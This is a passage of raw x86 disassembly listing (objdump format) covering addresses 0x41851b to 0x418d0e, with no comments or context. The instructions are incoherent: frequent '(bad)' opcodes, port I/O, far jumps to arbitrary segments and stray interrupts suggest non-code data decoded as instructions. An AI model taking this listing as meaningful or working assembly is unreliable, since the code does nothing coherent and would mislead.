  41851b:	ds pop es
  41851d:	iret   
  41851e:	mov    bl,BYTE PTR [edx]
  418520:	out    dx,eax
  418521:	ins    DWORD PTR es:[edi],dx
  418522:	or     cl,BYTE PTR [edi]
  418524:	xchg   esi,eax
  418525:	sub    al,BYTE PTR [edx]
  418527:	push   edi
  418528:	jp     0x4185a9
  41852a:	lods   eax,DWORD PTR ds:[esi]
  41852b:	pop    edx
  41852c:	pop    esp
  41852d:	adc    eax,0xf4abc4d6
  418532:	in     eax,0xc4
  418534:	fnstsw WORD PTR [edx+0x29]
  418537:	rcr    DWORD PTR [edx-0x2d50443d],1
  41853d:	test   eax,0x3f25e7a5
  418542:	mov    bh,0x58
  418544:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418545:	loope  0x4184d5
  418547:	imul   edx,DWORD PTR [ecx-0x6d7bfc88],0x7f
  41854e:	int    0x46
  418550:	dec    eax
  418551:	sbb    al,0xde
  418553:	push   ds
  418554:	gs js  0x41850d
  418557:	das    
  418558:	icebp  
  418559:	inc    edi
  41855a:	adc    esi,DWORD PTR [eax]
  41855c:	xor    al,0xb8
  41855e:	test   al,0x6c
  418560:	frstor [eax]
  418562:	push   eax
  418563:	mov    bh,0xf1
  418565:	lock test cl,cl
  418568:	dec    edx
  418569:	cwde   
  41856a:	in     al,0x36
  41856c:	idiv   ch
  41856e:	sub    BYTE PTR ds:0x1972a5df,al
  418574:	retf   0x172d
  418577:	adc    bh,ch
  418579:	and    DWORD PTR [edi],eax
  41857b:	loope  0x41858d
  41857d:	inc    ecx
  41857e:	lods   eax,DWORD PTR ds:[esi]
  41857f:	pop    ecx
  418580:	daa    
  418581:	xchg   ecx,eax
  418582:	aas    
  418583:	mov    edi,0x60dc2dde
  418588:	mov    ebx,0xa4c844cd
  41858d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41858e:	cmp    bh,BYTE PTR ds:0x125dd08b
  418594:	test   al,0x65
  418596:	jae    0x418518
  418598:	adc    DWORD PTR [edi-0x77],0xca938437
  41859f:	mov    edx,0x2e2809ac
  4185a4:	retf   0x142b
  4185a7:	fdivr  QWORD PTR [eax]
  4185a9:	and    BYTE PTR [ecx],0x6f
  4185ac:	and    al,0xfc
  4185ae:	gs mov ebp,0x7386bb11
  4185b4:	cdq    
  4185b5:	aam    0x2a
  4185b7:	mov    esi,0x6878b442
  4185bc:	gs dec ebx
  4185be:	mov    esp,DWORD PTR [ebp+0x3923ad78]
  4185c4:	aam    0xb4
  4185c6:	in     eax,0x44
  4185c8:	(bad)  
  4185c9:	(bad)  
  4185ca:	int    0xb7
  4185cc:	jge    0x41855f
  4185ce:	xor    al,0x5e
  4185d0:	mov    ds:0xe152954a,eax
  4185d5:	jle    0x41859c
  4185d7:	xor    DWORD PTR [ecx+0x28],edi
  4185da:	enter  0xdea6,0xaf
  4185de:	inc    DWORD PTR [ebp+0x762d8b56]
  4185e4:	cli    
  4185e5:	mov    ecx,0x73b6834
  4185ea:	fwait
  4185eb:	and    eax,0x2ff2f2ad
  4185f0:	adc    al,0xad
  4185f2:	stos   DWORD PTR es:[edi],eax
  4185f3:	cmp    ecx,esp
  4185f5:	fdiv   DWORD PTR [ebp+0x28]
  4185f8:	stos   BYTE PTR es:[edi],al
  4185f9:	sahf   
  4185fa:	mov    ecx,0x5e90b45e
  4185ff:	test   BYTE PTR [esi+eax*1+0x5e2425d4],cl
  418606:	dec    BYTE PTR [esi]
  418608:	mov    ebx,0x7c25754a
  41860d:	and    bl,0xa1
  418610:	xor    DWORD PTR [esi+ebp*1],esi
  418613:	mov    edi,0xd8395474
  418618:	sbb    BYTE PTR [edi-0x38],0xc2
  41861c:	mov    al,0xee
  41861e:	pop    DWORD PTR [ebx+ecx*2+0x3b2881e1]
  418625:	push   ecx
  418626:	das    
  418627:	in     al,0xfc
  418629:	arpl   dx,cx
  41862b:	or     BYTE PTR [edx+0x3e],0xb
  41862f:	cmp    ecx,0x9e751674
  418635:	adc    bl,BYTE PTR [edi]
  418637:	xor    eax,0x9ebe9c5e
  41863c:	jmp    0xd7d15b0d
  418641:	pop    esp
  418642:	je     0x4186c1
  418644:	cmp    al,0xe
  418646:	mov    bh,0x0
  418648:	jmp    0x5088:0xb682d6fb
  41864f:	mov    bh,0xd1
  418651:	mov    bh,BYTE PTR [ebx+0x26]
  418654:	out    0x16,al
  418656:	dec    esi
  418657:	(bad)
  41865a:	mov    al,0xa1
  41865c:	out    0x81,eax
  41865e:	pop    ss
  41865f:	cdq    
  418660:	adc    bh,BYTE PTR [ebx-0x22fee73]
  418666:	neg    BYTE PTR [ecx+0x44]
  418669:	sub    edi,eax
  41866b:	(bad)  
  41866c:	sahf   
  41866d:	popaw  
  41866f:	xchg   ebp,eax
  418670:	sub    edx,DWORD PTR [edx+0x29214bfa]
  418676:	xlat   BYTE PTR ds:[ebx]
  418677:	fadd   st,st(0)
  418679:	clc    
  41867a:	sbb    ecx,DWORD PTR [ebx]
  41867c:	inc    edx
  41867d:	fwait
  41867e:	xchg   edi,eax
  41867f:	xchg   ecx,eax
  418680:	push   ebp
  418681:	repnz mov cl,0xca
  418684:	cli    
  418685:	or     DWORD PTR ds:0x87b0a5b4,ecx
  41868b:	dec    esp
  41868c:	aas    
  41868d:	lock pop DWORD PTR [edx-0x2dc8a81b]
  418694:	xchg   edi,eax
  418695:	hlt    
  418696:	hlt    
  418697:	into   
  418698:	pusha  
  418699:	jno    0x4186c9
  41869b:	and    al,0x99
  41869d:	mov    bh,0x99
  41869f:	jb     0x418635
  4186a1:	pop    edx
  4186a2:	outs   dx,BYTE PTR gs:[esi]
  4186a4:	loopne 0x41871c
  4186a6:	scas   al,BYTE PTR es:[edi]
  4186a7:	cmp    ch,dh
  4186a9:	push   esp
  4186aa:	mov    ah,0xf2
  4186ac:	xchg   ebx,eax
  4186ad:	mov    esp,DWORD PTR ds:0x1c9d0f8e
  4186b3:	mov    ecx,eax
  4186b5:	inc    ecx
  4186b6:	mov    eax,ds:0xb22f3ed4
  4186bb:	inc    esp
  4186bc:	in     al,dx
  4186bd:	and    ah,ah
  4186bf:	jae    0x41872e
  4186c1:	dec    ebp
  4186c2:	les    esp,FWORD PTR [ecx+0x406c848b]
  4186c8:	jge    0x418729
  4186ca:	and    DWORD PTR [ecx],esp
  4186cc:	push   es
  4186cd:	xor    BYTE PTR [ebp-0x1318c755],ah
  4186d3:	test   eax,0xde3f110
  4186d8:	xor    bh,BYTE PTR [edi-0x3fe67149]
  4186de:	sbb    DWORD PTR [ecx+edi*8],0x4e706f84
  4186e5:	add    al,0xec
  4186e7:	push   ecx
  4186e8:	or     DWORD PTR [esi],eax
  4186ea:	cmp    al,BYTE PTR [ebx+0x6e9b4bf]
  4186f0:	push   ds
  4186f1:	sbb    DWORD PTR [edi],esi
  4186f3:	mov    bl,0x6c
  4186f5:	push   esp
  4186f6:	pushf  
  4186f7:	cmc    
  4186f8:	aad    0xfc
  4186fa:	aas    
  4186fb:	mov    ds:0x76165cd4,al
  418700:	fild   DWORD PTR [esi+0x8]
  418703:	rol    BYTE PTR [ebp+0x20c13654],0x1f
  41870a:	add    ebp,DWORD PTR [ecx]
  41870c:	sar    DWORD PTR [ebx+0x4ce3187],cl
  418712:	dec    esp
  418713:	add    cl,bl
  418715:	or     al,0x2
  418717:	hlt    
  418718:	adc    eax,0x813d73d9
  41871d:	push   ds
  41871e:	adc    eax,0x5f643e52
  418723:	cmc    
  418724:	pop    eax
  418725:	sbb    DWORD PTR [ecx+0x7d],eax
  418728:	and    al,0x19
  41872a:	scas   eax,DWORD PTR es:[edi]
  41872b:	(bad)  
  41872c:	call   FWORD PTR [ebx]
  41872e:	sbb    DWORD PTR [esi+0x5bbaf06],0xffffff9a
  418735:	in     al,dx
  418736:	test   eax,0x759653f6
  41873b:	ss daa 
  41873d:	jb     0x4186f2
  41873f:	jle    0x41879f
  418741:	cmp    dl,ah
  418743:	aam    0x89
  418745:	loop   0x418725
  418747:	ret    
  418748:	and    BYTE PTR [eax-0x63ca1472],al
  41874e:	(bad)  [ebp+esi*1-0x45]
  418752:	test   ebp,eax
  418754:	call   0xd599:0xd519d50c
  41875b:	sub    bl,0x74
  41875e:	pop    ss
  41875f:	lods   eax,DWORD PTR ds:[esi]
  418760:	pop    ebx
  418761:	push   0x5d
  418763:	test   eax,0x741e9aa7
  418768:	adc    bh,dl
  41876a:	out    dx,al
  41876b:	mov    ch,0x6b
  41876d:	sti    
  41876e:	sbb    ecx,DWORD PTR gs:[ebx+0xdcb2bc7]
  418775:	jecxz  0x4187f0
  418777:	push   ebp
  418778:	or     BYTE PTR [edi-0x5ec8e46a],al
  41877e:	retf   0xcae9
  418781:	(bad)  
  418782:	and    dl,cl
  418784:	pop    DWORD PTR [ebp-0x6e7327cd]
  41878a:	(bad)  
  41878b:	jbe    0x418786
  41878d:	cli    
  41878e:	(bad)  
  41878f:	push   eax
  418790:	imul   ebp,DWORD PTR [edx+0x61],0x2072941b
  418797:	test   eax,0x19d84581
  41879c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41879d:	cmp    ebp,eax
  41879f:	pop    ss
  4187a0:	lods   eax,DWORD PTR ds:[esi]
  4187a1:	sub    eax,0x16b336d5
  4187a6:	xor    BYTE PTR [ecx-0x32fb3f3e],0x9a
  4187ad:	popf   
  4187ae:	inc    ecx
  4187af:	test   BYTE PTR [ebp-0x31c4b949],ah
  4187b5:	xchg   DWORD PTR [ebx],ecx
  4187b7:	fst    DWORD PTR [eax+0x40e4848e]
  4187bd:	push   eax
  4187be:	dec    edx
  4187bf:	mov    ds:0x4992a6d2,al
  4187c4:	out    dx,al
  4187c5:	ins    DWORD PTR es:[edi],dx
  4187c6:	dec    ebx
  4187c7:	jae    0x4187c5
  4187c9:	pop    edi
  4187ca:	mov    ah,0xe
  4187cc:	dec    ebx
  4187cd:	dec    edi
  4187ce:	push   ebx
  4187cf:	shr    DWORD PTR [edi+0xf843b2c],0x5b
  4187d6:	fisub  WORD PTR [esi+0x34]
  4187d9:	jmp    0x418812
  4187db:	mov    edx,0xcc5b7aee
  4187e0:	jo     0x418843
  4187e2:	cmp    al,0xc
  4187e4:	out    0x15,eax
  4187e6:	add    ecx,DWORD PTR [eax-0x770c47bb]
  4187ec:	or     al,0xa2
  4187ee:	xchg   ebp,eax
  4187ef:	mov    ebp,0x74f7f459
  4187f4:	inc    esi
  4187f5:	xor    DWORD PTR [ecx],edx
  4187f7:	in     al,0xe3
  4187f9:	and    cl,cl
  4187fb:	xor    eax,0xfb65dec5
  418800:	and    bl,ch
  418802:	jnp    0x4187d1
  418804:	cmp    al,0x48
  418806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418807:	inc    eax
  418808:	dec    edi
  418809:	sbb    ah,BYTE PTR [edi+esi*2-0x42]
  41880d:	push   ecx
  41880e:	int3   
  41880f:	out    dx,eax
  418810:	fwait
  418811:	inc    ebx
  418812:	dec    ebp
  418813:	dec    ebx
  418814:	mov    bh,0x37
  418816:	pop    ebx
  418817:	nop
  418818:	pop    ecx
  418819:	ds pop ecx
  41881b:	clc    
  41881c:	cld    
  41881d:	jo     0x418833
  41881f:	(bad)  
  418820:	add    eax,0x637b282f
  418825:	xchg   esi,eax
  418826:	dec    edx
  418827:	loop   0x41887a
  418829:	push   esi
  41882a:	pop    ds
  41882b:	add    ch,0x31
  41882e:	lock dec esi
  418830:	lds    edi,FWORD PTR [ecx]
  418832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418833:	in     al,0xce
  418835:	mov    esp,0xf6d30d6b
  41883a:	dec    esi
  41883b:	xchg   DWORD PTR [ebp+0x6caca93f],ecx
  418841:	fisub  WORD PTR [ebp+0x1a]
  418844:	aad    0x33
  418846:	xor    BYTE PTR [edi],al
  418848:	out    dx,al
  418849:	push   ebp
  41884a:	mov    cs,WORD PTR [esi]
  41884c:	inc    ebx
  41884d:	hlt    
  41884e:	leave  
  41884f:	fwait
  418850:	push   ecx
  418851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418852:	mov    ebx,0xa5cd12f5
  418857:	(bad)  [ebp+0x1a8b5875]
  41885d:	fdiv   DWORD PTR [eax+edi*1]
  418860:	shrd   edi,ebx,cl
  418863:	jb     0x41880a
  418865:	(bad)  
  418866:	out    0x49,al
  418868:	adc    al,0x96
  41886a:	test   BYTE PTR [eax],bh
  41886c:	dec    edi
  41886d:	push   ebx
  41886f:	pop    ds
  418870:	cmp    al,0x5f
  418872:	lea    edi,[esi+0x32]
  418875:	xchg   ecx,eax
  418876:	lahf   
  418877:	shl    DWORD PTR [edi],1
  418879:	xor    BYTE PTR [ecx],al
  41887b:	or     eax,DWORD PTR [eax]
  41887d:	mov    cl,0x84
  41887f:	sub    al,0x4d
  418881:	push   esi
  418882:	out    dx,al
  418883:	push   cs
  418884:	mov    al,ds:0xeb0c30fb
  418889:	inc    edi
  41888a:	scas   al,BYTE PTR es:[edi]
  41888b:	dec    ecx
  41888c:	jb     0x41889f
  41888e:	outs   dx,DWORD PTR ds:[esi]
  41888f:	rcr    DWORD PTR [ebx+0x1],cl
  418892:	and    esp,ecx
  418894:	mov    BYTE PTR [ebp+0x17bec6e7],ah
  41889a:	inc    eax
  41889b:	jg     0x418882
  41889d:	or     dl,dh
  41889f:	cmp    edx,DWORD PTR [edi+0x78]
  4188a2:	mov    ds:0xaca7a851,al
  4188a7:	je     0x418832
  4188a9:	mov    dh,0xf1
  4188ab:	xchg   ebp,eax
  4188ac:	lea    ebx,[edi]
  4188ae:	xor    eax,DWORD PTR [esi-0x29bc190d]
  4188b4:	ds iret 
  4188b6:	jle    0x4188ba
  4188b8:	hlt    
  4188b9:	dec    eax
  4188ba:	mov    bl,0xd9
  4188bc:	sbb    DWORD PTR [edi+0x57785629],ebp
  4188c2:	mov    BYTE PTR [ebx+0x5d125937],bl
  4188c8:	xor    dl,BYTE PTR [edi-0x6c]
  4188cb:	test   eax,0x9663020a
  4188d0:	jmp    FWORD PTR [ecx-0x1c]
  4188d3:	push   ss
  4188d4:	mov    ds:0x3efb2a3,eax
  4188d9:	pop    ebx
  4188da:	arpl   WORD PTR [esi],dx
  4188dc:	aad    0x36
  4188de:	inc    esi
  4188df:	pop    edx
  4188e0:	fwait
  4188e1:	mov    eax,ds:0x3dcd857e
  4188e6:	xor    edi,DWORD PTR [eax+0x10]
  4188e9:	mov    edi,0x20226b5f
  4188ee:	mov    eax,0x32d81593
  4188f3:	push   edi
  4188f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188f5:	jmp    0x41888c
  4188f7:	jg     0x4188ac
  4188f9:	jecxz  0x41894c
  4188fb:	and    DWORD PTR [ebx],esi
  4188fd:	cdq    
  4188fe:	arpl   WORD PTR [bp+di+0x685],si
  418903:	icebp  
  418904:	jnp    0x4188b1
  418906:	fcom   QWORD PTR [esi-0x75b6e505]
  41890c:	mov    edi,0xbb03e83f
  418911:	sub    BYTE PTR [eax-0x22],0x6f
  418915:	inc    esi
  418916:	sub    eax,0x8c9bfa5a
  41891b:	mov    eax,0x50d79a9
  418920:	adc    al,0xbc
  418922:	test   DWORD PTR [edi+0x32],edx
  418925:	pushf  
  418926:	jne    0x4188eb
  418928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418929:	or     eax,0xf071ffeb
  41892e:	popa   
  41892f:	and    eax,0xa440fdfe
  418934:	dec    edx
  418935:	jmp    0x41898a
  418937:	fld    DWORD PTR [esi+eax*4+0x65bdad76]
  41893e:	inc    eax
  41893f:	add    eax,0x402f442a
  418944:	mov    edx,0xa2f83c80
  418949:	dec    ebx
  41894a:	or     ebx,esp
  41894c:	inc    edi
  41894d:	enter  0xf932,0x40
  418951:	dec    edx
  418952:	mov    ?,WORD PTR [ecx+0x34]
  418955:	rcr    ah,1
  418957:	(bad)  
  418958:	cmc    
  418959:	push   edi
  41895a:	jge    0x4188df
  41895c:	fucom  st(3)
  41895e:	enter  0xa73e,0x30
  418962:	popa   
  418963:	xor    BYTE PTR [esi],bh
  418965:	mov    esi,0x9da251e3
  41896a:	push   edi
  41896b:	jae    0x4189de
  41896d:	and    al,0xd
  41896f:	pop    es
  418970:	and    dh,dl
  418972:	(bad)  
  418973:	f2xm1  
  418975:	xchg   BYTE PTR [edi-0x2177f1a8],ah
  41897b:	and    ch,dl
  41897d:	call   0x4947:0x722c9880
  418984:	test   cl,bl
  418986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418987:	std    
  418988:	mov    cl,0x5d
  41898a:	nop
  41898b:	fadd   st(4),st
  41898d:	pop    esp
  41898e:	mov    eax,0x980fe3ba
  418993:	dec    ecx
  418994:	sti    
  418995:	pop    ds
  418996:	ror    ebx,0x22
  418999:	jo     0x4189b7
  41899b:	inc    esp
  41899c:	cmp    eax,0xc98d7362
  4189a1:	stos   BYTE PTR es:[edi],al
  4189a2:	inc    ebp
  4189a3:	jmp    0x418a05
  4189a5:	rol    ebx,1
  4189a7:	and    edx,DWORD PTR [ecx+0x89da077]
  4189ad:	daa    
  4189ae:	(bad)  [ebp+edx*1-0x72]
  4189b2:	les    esp,FWORD PTR [ecx+0x7772c237]
  4189b8:	imul   esp,esp,0xc9729193
  4189be:	mov    ebx,0x3062ab2e
  4189c3:	cmc    
  4189c4:	stos   DWORD PTR es:[edi],eax
  4189c5:	pop    edx
  4189c6:	jne    0x418a0a
  4189c8:	es cld 
  4189ca:	sub    edi,DWORD PTR [eax]
  4189cc:	shl    DWORD PTR [ecx+0x70],1
  4189cf:	(bad)  
  4189d0:	in     eax,0x2f
  4189d2:	dec    ecx
  4189d3:	je     0x418a18
  4189d5:	mov    bl,0x32
  4189d7:	je     0x41896a
  4189d9:	jne    0x418a14
  4189db:	jl     0x418983
  4189dd:	sub    esi,DWORD PTR [ebx]
  4189df:	jo     0x418971
  4189e1:	rcl    ecx,0x26
  4189e4:	mov    ss,WORD PTR [ebx-0x1a]
  4189e7:	add    ch,BYTE PTR [ebx+edi*4]
  4189ea:	aam    0x17
  4189ec:	xchg   DWORD PTR [esi-0x10],ebx
  4189ef:	pop    ds
  4189f0:	push   ds
  4189f1:	pushf  
  4189f2:	add    al,0x9f
  4189f4:	push   esp
  4189f5:	in     al,dx
  4189f6:	mov    ebp,es
  4189f8:	test   al,0xac
  4189fa:	sar    ch,1
  4189fc:	dec    ebp
  4189fd:	dec    ecx
  4189fe:	dec    esi
  4189ff:	dec    esp
  418a00:	push   cs
  418a01:	sbb    eax,0x9f0e6441
  418a06:	xlat   BYTE PTR ds:[ebx]
  418a07:	jne    0x418a43
  418a09:	cdq    
  418a0a:	push   ebp
  418a0b:	fistp  WORD PTR [ecx-0x3ac0917b]
  418a11:	fcomi  st,st(7)
  418a13:	adc    ebx,ecx
  418a15:	enter  0x56cc,0xf9
  418a19:	(bad)  
  418a1a:	mov    al,ds:0x5c45ca11
  418a1f:	jl     0x4189e5
  418a21:	inc    edi
  418a22:	adc    ch,bh
  418a24:	aaa    
  418a25:	push   ds
  418a26:	ror    BYTE PTR [ecx],1
  418a28:	cmp    eax,0x91d488c0
  418a2d:	jle    0x418a82
  418a2f:	clc    
  418a30:	cmp    al,0x8d
  418a32:	fnstcw WORD PTR [ebx-0x72aa4397]
  418a38:	dec    esp
  418a39:	sub    al,BYTE PTR [eax+0x17]
  418a3c:	out    0x91,al
  418a3e:	push   ds
  418a3f:	sub    al,ah
  418a41:	sbb    eax,DWORD PTR [ecx+0x4611d753]
  418a47:	or     al,BYTE PTR [ebx+0x18]
  418a4a:	mov    eax,0xf6c67c91
  418a4f:	rol    BYTE PTR [edi],1
  418a51:	mov    esp,0x642d6cd
  418a56:	pop    esi
  418a57:	test   DWORD PTR [eax-0x25872497],edi
  418a5d:	test   al,0xe2
  418a5f:	jb     0x418a31
  418a61:	outs   dx,DWORD PTR ds:[esi]
  418a62:	enter  0x7f9e,0x3d
  418a66:	mov    eax,esi
  418a68:	out    dx,eax
  418a69:	mov    al,0x8b
  418a6b:	mov    ah,0xe6
  418a6d:	dec    ebx
  418a6e:	pop    esp
  418a6f:	xor    DWORD PTR [ecx+0x372276b9],edx
  418a75:	pop    ecx
  418a76:	adc    cl,BYTE PTR [esp+eiz*4-0x3c]
  418a7a:	or     DWORD PTR [esi-0x53cd0f20],0x2564e225
  418a84:	mov    ds:0xc8857d09,eax
  418a89:	repz sbb al,0xec
  418a8c:	pusha  
  418a8d:	es xchg bl,bl
  418a90:	enter  0xa47f,0xbd
  418a94:	sub    ecx,ebp
  418a96:	out    dx,al
  418a97:	pop    es
  418a98:	das    
  418a99:	add    DWORD PTR [esi+0x25],ebx
  418a9c:	cmp    ebp,DWORD PTR [ebx-0x7a]
  418a9f:	add    eax,0xa2285e4b
  418aa4:	dec    edi
  418aa5:	inc    eax
  418aa6:	and    ebx,ebx
  418aa8:	icebp  
  418aa9:	arpl   WORD PTR [edi+0x4c],dx
  418aac:	and    eax,0x4c0f35ae
  418ab1:	lods   eax,DWORD PTR ds:[esi]
  418ab2:	push   eax
  418ab3:	mov    ebp,fs
  418ab5:	or     bh,0x12
  418ab8:	xor    dl,BYTE PTR [eax]
  418aba:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418abc:	in     eax,0x33
  418abe:	in     al,0x9b
  418ac0:	jne    0x418b1e
  418ac2:	out    0xad,al
  418ac4:	daa    
  418ac5:	fcmove st,st(1)
  418ac7:	inc    ecx
  418ac8:	neg    BYTE PTR [ebx-0x2d]
  418acb:	mov    ebx,0x8990ccd
  418ad0:	push   ss
  418ad1:	mov    cl,0xc9
  418ad3:	outs   dx,DWORD PTR ds:[esi]
  418ad4:	sub    al,0x7f
  418ad6:	push   0xcdb5f0bc
  418adb:	les    edx,FWORD PTR ds:0x1cedb99c
  418ae1:	imul   esp,DWORD PTR ds:0x4b4391ea,0x1721d7d
  418aeb:	shl    ecx,0x59
  418aee:	js     0x418b17
  418af0:	or     BYTE PTR [ecx+0x7a],0x1c
  418af4:	cmp    DWORD PTR [ebx-0x3d4d60ed],ecx
  418afa:	push   0xffffff9a
  418afc:	push   ebx
  418afd:	sti    
  418afe:	test   al,0x2f
  418b00:	dec    edx
  418b01:	pusha  
  418b02:	pavgw  mm6,QWORD PTR [ebx]
  418b05:	fnstsw WORD PTR [eax-0x65d6351a]
  418b0b:	mov    ebx,DWORD PTR [eax+0x9]
  418b0e:	push   esi
  418b0f:	mov    dh,0x95
  418b11:	lahf   
  418b12:	iret   
  418b13:	pop    ebp
  418b14:	addr16 push 0x3f
  418b17:	dec    eax
  418b18:	fcom   QWORD PTR [ebp+ebx*1-0x7a]
  418b1c:	test   cl,al
  418b1e:	out    0x2d,al
  418b20:	push   es
  418b21:	fmul   DWORD PTR [eax+0x5ccc3e03]
  418b27:	jo     0x418adf
  418b29:	inc    esp
  418b2a:	xor    ecx,DWORD PTR [edi+edx*8-0x27a5d463]
  418b31:	lds    esi,FWORD PTR [esi-0x9]
  418b34:	enter  0x68d6,0x21
  418b38:	jge    0x418b99
  418b3a:	sti    
  418b3b:	ss int3 
  418b3d:	repz jg 0x418bba
  418b40:	xor    BYTE PTR [eax-0x68edf29a],dl
  418b46:	add    BYTE PTR [edi+0x5d059dd6],bh
  418b4c:	out    0xf2,al
  418b4e:	sub    eax,0xb6997870
  418b53:	mov    ?,WORD PTR [edi+esi*2]
  418b56:	pop    ds
  418b57:	rcl    DWORD PTR [esi-0x30fb5b1],0xb3
  418b5e:	xor    dl,BYTE PTR [ecx]
  418b60:	mov    dh,0xd5
  418b62:	add    ebx,eax
  418b64:	mov    ds:0xcef85fcd,eax
  418b69:	lock rol DWORD PTR [ebp-0x19],0x5f
  418b6e:	test   DWORD PTR [ebp-0x298b0f6a],edi
  418b74:	push   cs
  418b75:	test   BYTE PTR [ebx],cl
  418b77:	mov    ds:0x7caf2b47,al
  418b7c:	das    
  418b7d:	add    eax,0x16295c7e
  418b82:	cdq    
  418b83:	les    esi,FWORD PTR [ecx+edi*4+0x4b829f61]
  418b8a:	or     cl,bh
  418b8c:	cli    
  418b8d:	in     eax,0x21
  418b8f:	push   ecx
  418b90:	popf   
  418b91:	pop    edi
  418b92:	mov    dl,0xdd
  418b94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b95:	ret    
  418b96:	shl    bl,cl
  418b98:	mov    ebp,0x509ec913
  418b9d:	in     eax,dx
  418b9e:	test   DWORD PTR [eax],edx
  418ba0:	mov    sp,0x67ef
  418ba4:	sub    al,0x7c
  418ba6:	into   
  418ba7:	xchg   ebx,eax
  418ba8:	jno    0x418b72
  418baa:	xor    dh,BYTE PTR es:[ebp-0x78]
  418bae:	test   eax,0x63d73a73
  418bb3:	mov    ds:0x20599ed1,eax
  418bb8:	push   ss
  418bb9:	xor    BYTE PTR [ebx],0x34
  418bbc:	xchg   esi,eax
  418bbd:	jmp    DWORD PTR [edx-0x77b2331f]
  418bc3:	mov    dh,0xb2
  418bc5:	mov    al,ds:0xed0fe74a
  418bca:	cmp    bl,al
  418bcc:	or     BYTE PTR [eax-0x24a393aa],dl
  418bd2:	out    dx,eax
  418bd3:	jbe    0x418b59
  418bd5:	mov    eax,ds:0xcd8efd2d
  418bda:	xchg   bh,dh
  418bdc:	(bad)  
  418bdd:	popa   
  418bde:	pushf  
  418bdf:	outs   dx,BYTE PTR ds:[esi]
  418be0:	scas   al,BYTE PTR es:[edi]
  418be1:	jns    0x418bd1
  418be3:	adc    dh,BYTE PTR [edi]
  418be5:	(bad)  
  418be7:	or     DWORD PTR [esi+0x46],esp
  418bea:	jo     0x418ba8
  418bec:	outs   dx,DWORD PTR ds:[esi]
  418bed:	xor    ecx,DWORD PTR [edx+0x5ce251fb]
  418bf3:	repnz int 0x75
  418bf6:	pop    ecx
  418bf7:	mov    ch,0x7b
  418bf9:	leave  
  418bfa:	int    0x3d
  418bfc:	cmp    al,0x9a
  418bfe:	mov    edi,0xb8b0ba93
  418c03:	fcomi  st,st(7)
  418c05:	aam    0x12
  418c07:	test   eax,0x9c194497
  418c0c:	sar    dl,cl
  418c0e:	jmp    0x8a03:0x235e8f6d
  418c15:	dec    ebx
  418c16:	push   0x13
  418c18:	ret    
  418c19:	je     0x418bab
  418c1b:	adc    al,0x89
  418c1d:	pop    esi
  418c1e:	gs push esi
  418c20:	pop    eax
  418c21:	mov    eax,0x5ef9e6c7
  418c26:	ss (bad) 
  418c28:	lds    eax,FWORD PTR [edx+0x3]
  418c2b:	shr    DWORD PTR [esi-0x1bfb3573],0x52
  418c32:	sub    al,0x80
  418c34:	and    dl,BYTE PTR [ecx+0x4ab90e0d]
  418c3a:	ret    
  418c3b:	clc    
  418c3c:	scas   eax,DWORD PTR es:[edi]
  418c3d:	mov    edx,0x718cd3eb
  418c42:	loope  0x418bd1
  418c44:	add    eax,0xf418ba7c
  418c49:	push   esp
  418c4a:	adc    edx,esi
  418c4c:	fwait
  418c4d:	out    dx,eax
  418c4e:	(bad)  
  418c50:	push   edx
  418c51:	pusha  
  418c52:	sub    ch,BYTE PTR [eax]
  418c54:	mov    edx,0xa9273b50
  418c59:	pop    ebx
  418c5a:	push   edx
  418c5b:	mov    ah,0x1d
  418c5d:	retf   
  418c5e:	add    bl,BYTE PTR [ebx-0x72641ae0]
  418c64:	mov    ecx,0xee980f45
  418c69:	or     dl,BYTE PTR [ebx+0x105aff99]
  418c6f:	scas   al,BYTE PTR es:[edi]
  418c70:	test   BYTE PTR [ebp+edi*2+0x5ac42bc0],0xfa
  418c78:	popf   
  418c79:	mov    cl,0xe1
  418c7b:	fsubr  QWORD PTR [ebx-0x70]
  418c7e:	push   ds
  418c7f:	mov    edx,?
  418c81:	inc    eax
  418c82:	ret    0x70e8
  418c85:	stc    
  418c86:	mov    eax,ds:0xa1e935c3
  418c8b:	fst    DWORD PTR [eax+0x3d]
  418c8e:	jg     0x418cad
  418c90:	daa    
  418c91:	fs jns 0x418c25
  418c94:	mov    ebp,0x8232281
  418c99:	mov    edi,DWORD PTR [edx+0x7d]
  418c9c:	pop    eax
  418c9d:	lock add eax,0xc32c622a
  418ca3:	loop   0x418c42
  418ca5:	mov    edi,DWORD PTR [ecx]
  418ca7:	sahf   
  418ca8:	xchg   edi,eax
  418ca9:	cmp    eax,0xdd42771a
  418cae:	adc    edi,eax
  418cb0:	dec    ebp
  418cb1:	add    al,0xc7
  418cb3:	jmp    0x62386ec0
  418cb8:	pop    eax
  418cb9:	mov    esi,0xc397c5d8
  418cbe:	fwait
  418cbf:	(bad)  
  418cc0:	or     ebp,ebp
  418cc2:	adc    DWORD PTR [ebx],edx
  418cc4:	or     edi,DWORD PTR [edi-0x32]
  418cc7:	adc    dl,BYTE PTR [edi-0x26]
  418cca:	pop    edx
  418ccb:	sbb    DWORD PTR [edx-0x2a32f7bd],esp
  418cd1:	or     DWORD PTR [edi+0x50],ebx
  418cd4:	loop   0x418c88
  418cd6:	add    eax,DWORD PTR [esi+0x4f5ae097]
  418cdc:	xor    ah,BYTE PTR [ebx+0x15d16ec]
  418ce2:	aaa    
  418ce3:	fldenv ds:0xcb546ec3
  418ce9:	cmp    al,BYTE PTR [ebx-0x525186cf]
  418cef:	fidivr DWORD PTR [ecx-0x7e]
  418cf2:	sbb    bh,BYTE PTR [eax+0x70a23a73]
  418cf8:	(bad)  
  418cf9:	fdivr  st,st(6)
  418cfb:	xor    al,0x64
  418cfd:	mov    esp,0x3669d16e
  418d02:	out    dx,al
  418d03:	adc    eax,DWORD PTR [esi+ebp*4-0x28]
  418d07:	mov    ah,0x1c
  418d09:	bound  esi,QWORD PTR [ecx]
  418d0b:	test   dl,bl
  418d0d:	inc    edx
  418d0e:	retf   
